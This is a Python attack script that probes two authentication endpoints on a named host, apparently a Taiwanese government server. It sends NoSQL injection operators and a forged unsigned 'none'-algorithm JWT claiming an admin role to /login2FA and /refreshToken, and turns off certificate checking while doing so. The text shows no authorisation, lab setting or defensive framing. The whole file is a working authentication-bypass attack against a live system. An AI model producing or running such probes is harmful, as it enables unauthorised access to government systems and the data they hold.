import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

print("=== /login2FA NoSQL 注入测试 (userToken 参数) ===")
tests=[
  ("base", {"userToken":"x","domain":"AUTH_SERVER"}),
  ("ne", {"userToken":{"$ne":None},"domain":"AUTH_SERVER"}),
  ("ne-obj", {"userToken":{"$ne":""},"domain":"AUTH_SERVER"}),
  ("or", {"userToken":{"$or":[{"userToken":"a"},{"userToken":"b"}]},"domain":"AUTH_SERVER"}),
  ("empty", {"userToken":"","domain":"AUTH_SERVER"}),
  ("null", {"userToken":None,"domain":"AUTH_SERVER"}),
  ("none-alg", {"userToken":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInVzZXIiOnsicm9sZSI6IkFETUlOIn0sInBlcm1pc3Npb25zIjpbIkFVVEhfQURNSU4iXSwiZXhwIjoxOTk5OTk5OTk5fQ.","domain":"AUTH_SERVER"}),
]
for name, body in tests:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    try:
        r=s.post(BASE+"/login2FA", json=body, timeout=10)
        print(f"  {name:10s} -> {r.status_code} {r.text[:70]}")
    except Exception as e:
        print(f"  {name:10s} -> ERR {repr(e)[:40]}")
    time.sleep(0.1)

print("\n=== /refreshToken NoSQL 注入测试 ===")
for name, body in [("ne",{"refreshToken":{"$ne":None}}),("str",{"refreshToken":"x"}),("empty",{"refreshToken":""})]:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        r=s.post(BASE+"/refreshToken", json=body, timeout=10)
        print(f"  {name:10s} -> {r.status_code} {r.text[:70]}")
    except Exception as e:
        print(f"  {name:10s} -> ERR {repr(e)[:40]}")
    time.sleep(0.1)
print("DONE")
